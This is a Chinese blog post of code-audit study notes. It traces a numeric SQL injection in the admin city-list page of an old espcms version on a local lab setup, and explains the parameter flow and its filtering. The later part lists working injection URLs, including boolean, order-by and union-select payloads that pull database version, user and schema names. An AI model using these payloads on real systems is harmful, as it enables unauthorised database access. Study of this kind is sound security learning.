---
layout: post
title:  "代码审计入门笔记—分析一个旧版本 espcms SQL 注入漏洞"
date:   2018-04-22
categories: codes-audit
tags: codes-audit espcms sql-injection seay
author: 6xian or xian6
---

* content
{:toc}

本文想投稿“信安之路”公众号，未通过审核，记录在自己的博客。

最近在读《代码审计：企业级 Web 代码安全架构》，作者是尹毅。

我的想法是，精读这本书，从而入门 PHP 代码审计，能够利用工具检测一些轻量级 CMS 的漏洞，分析代码逻辑，理解漏洞原理，尝试编写 POC 和 Paper。学习过程中做好笔记，举一反三，总结提高。

笔记主要记录漏洞的形成原理和利用方法，这会比较难，但只有这样才能提高，希望自己能够坚持这个原则，真正学懂代码审计，也提高逻辑推理和文字表达能力。

本篇笔记记录一个简单的 SQL 注入漏洞的原理、触发和利用的过程。

## 代码审计的一些认识

### 0x01 代码审计概念

代码审计是指对源代码进行检查，寻找可能引发安全问题的漏洞，并对漏洞进行测试验证的过程。

代码审计需要多方面的技能，要能够理解代码的逻辑、漏洞形成的原理、众多工具的灵活使用。每一次代码审计都是一项系统化的工程。

### 0x02 代码审计思路

常见的代码审计思路包括：

* 根据敏感函数或关键字回溯参数传递过程
* 查找可控变量，正向追踪变量传递过程
* 寻找敏感功能点，通读功能点代码
* 直接通读全文代码

### 0x03 PHP 代码审计需要掌握的知识

* PHP 编程基础
* PHP 核心配置和危险函数
* HTML 和 JavaScript 等 Web 前端编程基础
* MySQL 常用函数和 SQL 语句
* SQL 注入漏洞原理，还有 XSS、文件包含、命令执行等漏洞原理
* 靶机环境准备
* 工具的运用。包括 Seay 自动化代码审计、phpstudy 自动化构建 PHP + MySQL 开发环境、Sublime Text 编辑等工具的运用。

## espcms SQL 注入漏洞分析和利用

### 0x01  靶机环境

用 phpStudy 搭建 PHP 和 MySQL 环境，安装 espcms。

```
服务器解译引擎
版本：Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9

PHP
版本：5.3.29

MySQL
版本：5.5.53
用户：root
口令：root
数据库：espcms_v5

espcms
版本：V5.9.14.08.28
url：http://localhost/espcms/
管理员：admin
口令：qwe123
```

### 0x02 漏洞原理

用作者的开源代码审计工具 Seay 来完成自动审计，看看能发现什么。在 Seay 中，新建项目，自动审计，并将结果生成报告。

<!-- ![1524122877177](attaches/1524122615876.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524122615876.png"></a>
</figure>

> 补充说明下我使用的工具。
>
> 我用 Sublime Text 3 和 Notepad++ 来辅助分析。对于 PHP 语言，Sublime 可以跳转到函数定义代码(`F12`)，Jump Back(`Alt+-`)，Jump Forward(`Alt+Shift+-`)。Notepad++ 可以查看函数列表。两个工具都能打开文件夹，以目录树的方式查看文件，都支持文件夹搜索。这样可以提高分析速度。
>
> Seay 系统的自动审计功能，是利用正则匹配的方式，来找出代码中敏感函数或 SQL 语句关键字，并判断变量是否符合常见漏洞的触发模式，比如 SQL 语句的条件参数是否有引号等，来判断是否存在漏洞。Seay 系统有一套正则匹配的规则，并且能自己添加规则，这套规则也是学习的重点。

下面对第 28 条结果进行分析。

<!-- ![1524122966676](attaches/1524122966676.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524122966676.png"></a>
</figure>

```
28	
SQL语句select中条件变量无单引号保护，可能存在SQL注入漏洞	
/adminsoft/control/citylist.php	
$sql = "select * from $db_table where parentid=$parentid";
```

即 `where` 里的条件变量 `$parentid` 没有用引号进行保护，如果没有对变量进行很好的过滤检查的话，可能存在 `SQL 注入` 漏洞风险。

定位 `citylist.php` 文件的关键代码。

```php
$parentid = $this->fun->accept('parentid', 'R');
$parentid = empty($parentid) ? 1 : $parentid;

$sql = "select * from $db_table where parentid=$parentid";
$rs = $this->db->query($sql);
```

`$parentid` 变量在 `oncitylist()` 函数中， 是 `accept('parentid', 'R')` 函数的返回值。由 `$parentid = empty($parentid) ? 1 : $parentid;` 可以看出 `$parentid` 变量接收的是数值，可能存在数值型注入漏洞。

知道了变量的传递过程后，我们跟进 `accept()` 函数。在 Sublime 里 `F12`，选择 `public/class_function.php()` 文件，定位到 `accept()` 函数。	

<!-- ![1524124926143](attaches/1524124926143.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524124926143.png"></a>
</figure>

```php
function accept($k, $var = 'R', $htmlcode = true, $rehtml = false) {
		switch ($var) {
			...
			case 'R':
				$var = &$_GET;
				if (empty($var[$k])) {
					$var = &$_POST;
				}
				break;
		}

		$putvalue = isset($var[$k]) ? $this->daddslashes($var[$k], 0) : NULL;
		return $htmlcode ? ($rehtml ? $this->preg_htmldecode($putvalue) : $this->htmldecode($putvalue)) : $putvalue;
}

```

根据传入的参数 `accept('parentid', 'R')`， 来详细分析下 `accept()` 的返回值是什么。

**先来分析下 `$var` 变量的值**，`$var` 变量赋值的逻辑是，先赋值 `$_GET` 数组， 判断 `$_GET[parentid]` 是否为空，如果为空就赋值 `$_POST` 数组。 即，如果 URL 地址有 parentid 参数的话，就取`$_GET`，否则取 `$_PUT`。

> 解释下几个 PHP 超全局变量，`$_GET` 数组存储的是 GET 方式提交的数据，一般是 URL 地址的变量键值对，`$_POST` 数组存储的是 POST 方式提交的数据，一般是页面表单的变量键值对。`$_REQUEST` 数组，包含了 `$_GET`，`$_POST`，`$_COOKIE` 的值。

**接下来分析下 `$putvalue` 变量的值**，用 `daddslashes()` 函数对 `$var[parentid]` 进行转义处理，将字符串里的单引号（`'`）、双引号（`"`）、反斜线（`\`）、NUL（NULL 字符）等进行转义，即在这些字符前加上反斜线（`\`）。要注意的是，`addslashes()` 函数只是转义上述特殊字符，返回转义后的字符串，如果传入的参数是数值，则直接返回该数值。

```php
function daddslashes($string, $force = 0, $strip = FALSE) {
		if (!get_magic_quotes_gpc() || $force == 1) {
			if (is_array($string)) {
				foreach ($string as $key => $val) {
					$string[$key] = addslashes($strip ? stripslashes($val) : $val);
				}
			} else {
				$string = addslashes($strip ? stripslashes($string) : $string);
			}
		}
		return $string;
	}
```

```php
// addslashes() 的简单测试
// 疑问：PHP 手册里说明，addslashes() 函数是在(PHP 4, PHP 5, PHP 7)版本启用。
// 但是在 (PHP 3) 版本里，为什么也可以正常执行？
<?php

$string = "', \, \"";
print_r(addslashes($string)); // 输出 \', \\, \"
echo '<br><br>';

$parentid = 1;
print_r(addslashes($parentid)); // 输出 1
echo '<br><br>';
```

> 补充几个知识点：
>
> **`magic_quotes_gpc`**
>
> 当 `magic_quotes_gpc` 设置为 on，所有的` ' (单引号)、" (双引号)、\（反斜杠）和 NUL's` 被一个反斜杠自动转义。 （本特性已自 PHP 5.3.0 起废弃并从 PHP 5.4.0 开始移除）
>
> **`addslashes()`**
>
> `string addslashes ( string $str )` 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是`单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）`。
>
> PHP 5.4 之前 PHP 指令 `magic_quotes_gpc` 默认是 on， 实际上所有的 GET、POST 和 COOKIE 数据都用被 `addslashes()` 了。 不要对已经被 `magic_quotes_gpc` 转义过的字符串使用 `addslashes()`，因为这样会导致双层转义。 遇到这种情况时可以使用函数 `get_magic_quotes_gpc()` 进行检测。

**接下来分析下返回值**，最后一句 return 语句，通过 `preg_htmldecode` 和 `htmldecode` 两个函数对输入进行过滤检测，防止不安全字符的输入，这里简单理解下 两个函数的功能。

`preg_htmldecode` 函数对 `'&', '"', '<', '>'` 等字符转换为 HTML 字符实体 `'&amp;', '&quot;', '&lt;', '&gt;'`，因为在 HTML 中对某些字符进行了预留，以避免把这些字符误认为标签，如果要正常显示这些预留字符，必须在 HTML 源码中使用字符实体。

`htmldecode` 函数对 `<script>` 脚本功能和标签等字符进行过滤，直接转换为空值，如果用户可以提交脚本数据，很容易进行 XSS 攻击，这里进行了简单的过滤来防范。

> 这里用到了正则的知识，我对正则的运用很不熟悉，理解代码有些困难，后续要详细的学习一遍，很多过滤功能都要用到正则，如果正则的运用不严谨，很容易出现漏洞。代码审计应该要能够非常熟悉正则运用。

```php
function preg_htmldecode($string) {
		if (is_array($string)) {
			foreach ($string as $key => $val) {
				$string[$key] = $this->preg_htmldecode($val);
			}
		} else {
			$string = str_replace(array('&', '"', '<', '>'), array('&amp;', '&quot;', '&lt;', '&gt;'), $string);
			$string = preg_replace('/&amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/', '&\\1', $string);
		}
		return $string;
	}

	function htmldecode($str) {
		if (empty($str)) return $str;
		$search = array(
		    "'<script[^>]*?>.*?</script>'si",
		    "'<[\/\!]*?[^<>]*?>'si",
		);
		$replace = array(
		    "",
		    "",
		);
		if (!is_array($str)) {
			$str = htmlspecialchars(trim($str));
			$str = @preg_replace($search, $replace, $str);
		} else {
			foreach ($str as $key => $val) {
				$str[$key] = htmlspecialchars($val);
				$str[$key] = $this->htmldecode($val);
			}
		}
		return $str;
	}
```

**分析了 `accept()` 的返回值后，就很清楚漏洞存在的原因了，根本的问题是 `$parentid` 没有用引号进行闭合，后续对该变量的过滤都形同虚设，是一个数值型 SQL 注入漏洞，在注入时，不需要用引号来闭合源码本身的 SQL 语句，可以用 union select 等语句来拼接自己构造的 SQL 语句进行查询，就很容易获取数据库信息了。**

`$sql = "select * from $db_table where parentid=$parentid";` 

### 0x03 漏洞触发

知道了代码存在的漏洞，下步就是要想办法来触发漏洞，上述 SQL 语句位于 `oncitylist()` 函数，该函数是 `important` 类的成员函数，父类是 `connector`。所在文件为 `/adminsoft/control/citylist.php`。所以我们的目标就是要构造 URL 参数或者某个页面表单参数，来触发 `citylist.php` 文件里的 `oncitylist()` 函数。

先尝试直接访问该文件，以及它的目录，出现以下错误，应该是 PHP 系统和语言的问题，与该 CMS 本身代码无关，跳过不管。

<!-- ![1524208518197](attaches/1524202850720.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524202850720.png"></a>
</figure>

<!-- ![1524208104442](attaches/1524202685279.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524202685279.png"></a>
</figure>

再访问上一级目录，即 `/adminsoft`，会跳转到 `http://127.0.0.1/espcms/adminsoft/index.php?archive=adminuser&action=login`，网站管理员的登陆页面。其实从文件目录也可以看出，这个漏洞的触发需要管理员登陆后才可以，从常规的渗透测试流程来看，是不太可能提前获取管理官权限的，除非授权进行白盒测试才可能拿到权限。这里作为学习素材，先用管理员权限来测试。

<!-- ![1524208994064](attaches/1524208994064.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524208994064.png"></a>
</figure>

用管理员账号和口令登陆。地址跳转到 

`http://127.0.0.1/espcms/adminsoft/index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter`

<!-- ![1524209590854](attaches/1524209590854.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524209590854.png"></a>
</figure>

有些基本的尝试后，我们再来看下 `citylist.php` 代码。既然是 `oncitylist()` 函数有问题，函数属于 `important` 类，就要从全局找下在哪里实例化了这个类。

利用 Seay 工具的全局搜索，或 Sublime 的文件夹搜索，很容易定位到实例化 `important` 类的文件，为 `/adminsoft/index.php`。

<!-- ![1524210507024](attaches/1524210507024.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524210507024.png"></a>
</figure>

`index.php` 代码不长，我们定位到实例化 `important` 类的代码附近细看下。

<!-- ![1524210783759](attaches/1524210783759.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524210783759.png"></a>
</figure>

代码如下：

```php
$archive = indexget('archive', 'R');
$archive = empty($archive) ? 'adminuser' : $archive;

$action = indexget('action', 'R');
$action = empty($action) ? 'login' : $action;

if (in_array($archive, array('acmessagemain', 'adminuser', 'advertmain', 'adverttypemain', 'albummain', 'article', 'bbsmain', 'bbstypemain', 'callmain',
	    'citylist', 'connected', 'createmain', 'createseomain', 'enquirymain', 'filemain', 'filemanage', 'formmain', 'formmessmain', 'language', 'languagepack',
	    'lib_menu', 'mailinvite', 'mailsendmain', 'mailtemplatemain', 'management', 'memattmanage', 'membermain', 'memclassmanage', 'modelmanage', 'ordermain',
	    'payplug', 'payreceipt', 'powergroup', 'printtemplatemain', 'recommanage', 'seomanage', 'shipplug', 'shipreceipt', 'sitemain', 'skinmain', 'sqlmanage', 'smstemplatemain',
	    'subjectmanage', 'templatemain', 'typemanage', 'mobliemain', 'smsmain'))) {
	if (!file_exists(admin_ROOT . adminfile . "/control/$archive.php")) {
		exit('Access error!');
	}
	include admin_ROOT . adminfile . "/control/$archive.php";
	$control = new important();
	$action = 'on' . $action;
	if (method_exists($control, $action)) {
		$control->$action();
	} else {
		exit('错误：系统方法错误！');
	}
} else {
	exit('Access error!');
}
```

可以看出：

`$archive`  变量的取值范围是 `/adminsoft/control` 下的文件名，默认为 `adminuser`。

`$action` 变量的值，在其前加上 `on` 就是上述文件里的函数名，默认为 `login`。

所以，在管理员未登陆的情况下，自动跳转地址里的参数就是按照这两个默认值来设置的，即 `/adminsoft/index.php?archive=adminuser&action=login`。

按照这个规律，我们尝试来触发 `/adminsoft/control/citylist.php` 里的 `oncitylist()` 函数。 构造 URL 为：

`/adminsoft/index.php?archive=citylist&action=citylist`

访问该地址，结果如下：

<!-- ![1524212250660](attaches/1524212250660.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524212250660.png"></a>
</figure>

可以看到，成功调用了 `oncitylist()` 函数，说明上述规律是正确的，结合前面漏洞原理的分析结果，尝试把 `parentid` 这个变量作为参数加入到 URL 里，其值先取数字 1。URL 为：

`/adminsoft/index.php?archive=citylist&action=citylist&parentid=1`

访问该地址，结果如下：

<!-- ![1524212676068](attaches/1524212676068.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524212676068.png"></a>
</figure>

结果好像没有变化，修改 `parentid` 的值为数字 2 再访问。

<!-- ![1524212806791](attaches/1524212806791.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524212806791.png"></a>
</figure>

可以看到，只是显示“北京”，多次尝试后，可以知道这个参数表示省份，1 为所有的省，2 为北京，3 为安徽等等，查询的结果就是相应省份下面的市。

至此，我们已经触发了`/adminsoft/control/citylist.php` 里的 `oncitylist()` 函数，并能够加上查询条件参数 `parentid`。

### 0x04 漏洞利用

下面开始尝试 SQL 注入。

`http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1'`

<!-- ![1524213359695](attaches/1524213359695.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524213359695.png"></a>
</figure>

`http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1 and 1=1`

<!-- ![1524214217167](attaches/1524214217167.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524214217167.png"></a>
</figure>

`http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1 and 1=2`

<!-- ![1524214297384](attaches/1524214297384.png) -->

<figure>
<a><img src="{{site.url}}/attaches/2018-04-22-codes-audit-basic-espcms-numeric-sqli/1524214297384.png"></a>
</figure>

构造 3 个 `parentid` 的值，验证了漏洞存在。

```
http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1'
// 加引号后，报错

http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1 and 1=1
// 和 parentid=1 的结果一致

http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1 and 1=2
// 因为查询条件为 False，没有结果

```

通过 order by 或 union select 来获取一些数据库信息。需要注意的是，在拼接的查询中，不能有引号、反斜线等字符，会被转义成前面加上反斜线的形式。

```
http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=1 order by 6
// 当尝试到 order by 6 后，返回出错信息，说明数据表为5列

http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=-1 union select 1,2,3,4,5
// 显示 3，说明 parentid 是表的第 3 列

http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=-1 union select 1,2,version(),4,5
// 修改 3 为要获取的信息

数据库版本：version() 
当前 MySQL 用户： user()
当前数据库名： database()
数据库路径： @@datadir
操作系统版本： @@version_compile_os
获取所有数据库名：
http://127.0.0.1/espcms/adminsoft/index.php?archive=citylist&action=citylist&parentid=-1 union select 1,2,group_concat(schema_name),4,5 from information_schema.schemata

```

这里就简单列了下常用的注入语句，更多的注入语句，考虑单独写一篇笔记进行总结。

利用 MySQL 的客户端查询下数据表结构，验证下上面的结果。

```
mysql> desc espcms_city;
+------------+----------------------+------+-----+---------+----------------+
| Field      | Type                 | Null | Key | Default | Extra          |
+------------+----------------------+------+-----+---------+----------------+
| id         | smallint(5) unsigned | NO   | PRI | NULL    | auto_increment |
| parentid   | smallint(5) unsigned | NO   | MUL | 0       |                |
| cityname   | varchar(120)         | NO   |     | NULL    |                |
| regiontype | tinyint(1)           | NO   | MUL | 2       |                |
| agencyid   | smallint(5) unsigned | NO   | MUL | 0       |                |
+------------+----------------------+------+-----+---------+----------------+
5 rows in set (0.04 sec)
```

至此，这次简单的代码审计就算告一段落，针对这个版本的 espcms，还可以学习其他一些漏洞的代码审计知识。根据 Seay 的自动审计结果，除了 SQL 注入外，还有一些文件包含、任意文件读取、命令执行等漏洞，每个漏洞的审计都要详细，有结果，一点点积累。在代码审计和渗透测试领域，只有积累足够多的细节才能用简单的思路去做更复杂的事情。

## 总结

完成了 espcms 一个简单 SQL 注入漏洞的代码审计知识学习和实践，总结下做过的工作。

* 在本地搭建靶机环境，用 phpStudy 能快速构建 PHP +MySQL 的环境，切换不同版本，结合 Sublime 就可以有一个便捷的 PHP 开发环境。
* 这次审计的思路采取的是，检查敏感关键字的参数，回溯参数变量传递过程，判断变量是否可控，有没有经过转义和过滤等安全检查。用 Seay 审计系统自动检查 select 语句的条件参数，匹配到参数没有用引号进行保护，存在 SQL 注入风险；回溯条件参数变量，发现经过反斜线转义和脚本标签过滤等安全检查；由于变量不在引号内，只要构造的注入语句不用到引号、反斜线、脚本标签等字符，就可以进行 SQL 注入。
* 结合自动化代码审计工具，采用匹配敏感函数或 SQL 语句关键字，逆向追踪回溯参数的审计思路，能够快速的发现常规性的漏洞。但不利于从全局发现整个系统存在的逻辑问题。

因为不太会 PHP 编程语言，花了很多时间来理解代码，也花了很长时间来做学习笔记。虽然漏洞很简单，而且参考了别人的思路，但这算是自己第一个完成的代码审计工作，有了第一个，我想就会有第二个。完整的学习笔记，对初学者来说，也是一个很好的参考资料。

## 参考

[PHP代码审计菜鸟笔记](https://sosly.me/index.php/2018/04/03/php_daimashenji2)   *sosly 菜鸟笔记*



